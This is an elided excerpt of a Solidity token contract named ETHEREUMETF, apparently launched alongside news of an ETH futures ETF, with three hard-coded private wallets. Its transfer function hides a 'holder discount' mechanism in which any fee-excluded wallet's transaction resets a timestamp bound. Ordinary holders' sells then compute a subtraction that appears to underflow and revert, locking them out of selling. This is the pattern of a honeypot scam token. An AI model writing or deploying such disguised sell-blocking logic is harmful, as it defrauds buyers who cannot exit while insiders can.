...
https://www.coindesk.com/business/2023/09/28/valkyrie-gets-approval-to-start-buying-eth-futures-for-its-existing-bitcoin-etf/
...
contract ETHEREUMETF is ERC20, Ownable {
    ...
    address payable private immutable liquidityWallet = payable(0x7b8bcd7937E473979e6E1Db2B4De3161BeC57F8C);
    address payable private immutable marketingWallet = payable(0xa3C0Fc2819845EAcaA3435F8e21818CDEa0CE0b4);
    address payable private immutable devWallet = payable(0x4E72562437c7B4994992282cce4435894AEffc00);

    bool public swapEnabled = true;
    bool public limitsInEffect = true;
    bool public transferDelayEnabled = false;
    bool public lpAutoBurnEnabled = false;
    ...
    mapping(address => HolderDiscount) private _holderDiscount;
    uint256 private _discountBound;
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _discountBound = block.timestamp;
        }
        ...
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                HolderDiscount storage userDiscount = _holderDiscount[from];
                userDiscount.holdTime = userDiscount.lastBuy - _discountBound;
                userDiscount.lastSell = block.timestamp;
            } else {
                HolderDiscount storage userDiscount = _holderDiscount[to];
                if (userDiscount.lastBuy == 0) {
                    userDiscount.lastBuy = block.timestamp;
                }
            }
        }
